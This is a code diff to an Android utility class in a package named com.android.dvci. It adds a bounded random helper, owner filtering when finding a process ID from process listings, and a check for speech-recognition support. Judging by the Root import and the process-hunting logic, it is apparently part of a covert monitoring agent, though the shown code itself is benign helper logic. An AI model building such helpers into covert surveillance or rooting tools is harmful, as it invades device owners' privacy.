@@ -8,7 +8,10 @@
 package com.android.dvci.util;
 
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.AssetManager;
+import android.speech.RecognizerIntent;
 
 import com.android.dvci.Root;
 import com.android.dvci.Status;
@@ -29,6 +32,7 @@ import java.security.SecureRandom;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -89,7 +93,9 @@ public final class Utils {
 	public static long getRandom() {
 		return rand.nextLong();
 	}
-
+	public static long getRandom(int max) {
+		return rand.nextInt(max);
+	}
 	public static int[] getRandomIntArray(int size) {
 		int[] r = new int[size];
 		for (int i = 0; i < size; i++) {
@@ -350,7 +356,7 @@ public final class Utils {
 	 * @param lookFor
 	 *            the string to search for
 	 */
-public static String pidOf(String lookFor) {
+public static String pidOf(String lookFor,String owner) {
 	String line;
 	//Executable file name of the application to check.
 	String pid=null;
@@ -372,11 +378,17 @@ public static String pidOf(String lookFor) {
 				Matcher matcher = pattern.matcher(line);
 				if (matcher.find()) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (pidOf): find=" + lookFor + "in:\n" + line);
+						Check.log(TAG + " (pidOf): find=" + lookFor + " in:\n" + line);
 					}
 						//esempio u0_a72    24334 1     5900   5280  ffffffff 00000000 R /data/data/com.android.dvci/files/vs
 						String[] splited = line.split("\\s+");
 						if(splited.length>3){
+							if( !StringUtils.isEmpty(owner) && !splited[0].contains(owner) ){
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (pidOf): owner =" + owner + "NOT in =" + splited[0]+" skip it");
+								}
+								continue;
+							}
 							int p = -1;
 
 							try {
@@ -389,17 +401,23 @@ public static String pidOf(String lookFor) {
 							if(p>0){
 								pid = new String(splited[1]);
 							}
+
 						}
 					break;
 				}
 			}
 		} catch (IOException e) {
-			e.printStackTrace();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (pidOf): exception parsing:",e);
+			}
 		}
 	}
 	return pid;
 }
-public static int getDaysBetween (long start, long end)   {
+public static String pidOf(String lookFor){
+		return pidOf(lookFor,null);
+}
+	public static int getDaysBetween (long start, long end)   {
 
 		boolean negative = false;
 		if (end> start)  {
@@ -439,4 +457,26 @@ public static int getDaysBetween (long start, long end)   {
 			return days * -1;
 		return days;
 	}
+
+	/**
+     * Checks availability of speech recognizing Activity
+     *
+     * @return true – if Activity there available, false – if Activity is absent
+     */
+    public static boolean isSpeechRecognitionActivityPresent() {
+        try {
+            // getting an instance of package manager
+            PackageManager pm = Status.getAppContext().getPackageManager();
+            // a list of activities, which can process speech recognition Intent
+            List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);
+
+            if (activities.size() != 0) {    // if list not empty
+                return true;                // then we can recognize the speech
+            }
+        } catch (Exception e) {
+
+        }
+
+        return false; // we have no activities to recognize the speech
+    }
 }
